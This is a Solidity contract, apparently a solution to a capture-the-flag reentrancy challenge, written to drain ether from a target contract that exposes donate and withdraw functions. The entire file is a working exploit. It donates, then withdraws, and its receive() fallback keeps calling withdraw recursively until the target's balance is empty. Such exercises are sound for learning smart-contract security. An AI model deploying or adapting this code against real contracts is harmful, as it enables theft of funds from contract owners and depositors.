// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract CheatReentrance {
    IReentrance public reentrance;
    uint256 amountDonate;

    constructor(address payable _adr) public {
        reentrance = IReentrance(_adr);
    }

    function cheatDonate() public payable {
        amountDonate = msg.value;
        reentrance.donate{value: amountDonate}(address(this));
    }

    function cheatWithdraw() public {    
        reentrance.withdraw(amountDonate);
    }

    function myBalance() public view returns(uint256){
        return address(this).balance;
    }

    function itBalance() public view returns(uint256){
        return address(reentrance).balance;
    }
    
    receive() external payable {
        uint256 challengeTotalRemainingBalance = address(reentrance).balance;
        bool keepRecursing = challengeTotalRemainingBalance > 0;
        if (keepRecursing) {
            uint256 tWd = amountDonate < challengeTotalRemainingBalance ? amountDonate : challengeTotalRemainingBalance;
            reentrance.withdraw(tWd);
        }

    }
}
